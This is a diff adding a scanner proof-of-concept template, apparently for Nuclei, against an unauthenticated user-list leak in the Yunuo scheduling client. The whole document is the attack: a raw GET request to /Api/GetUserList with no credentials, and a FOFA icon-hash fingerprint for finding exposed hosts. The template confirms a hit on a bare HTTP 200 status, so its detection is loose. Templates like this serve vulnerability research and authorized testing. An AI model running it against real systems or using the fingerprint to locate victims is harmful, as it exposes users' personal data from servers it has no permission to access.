@@ -1,0 +1,25 @@
+id: poc-bktgmawq9nmvfhq3
+info:
+  name: 雨诺调度客户端 UserList 存在未授权访问敏感信息泄露漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/bktgmawq9nmvfhq3'
+  tags: info-leak,unauth,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: bktgmawq9nmvfhq3
+    fofa: icon_hash=="1268292329"
+http:
+- raw:
+  - 'GET /Api/GetUserList HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
+
+    Connection: close'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
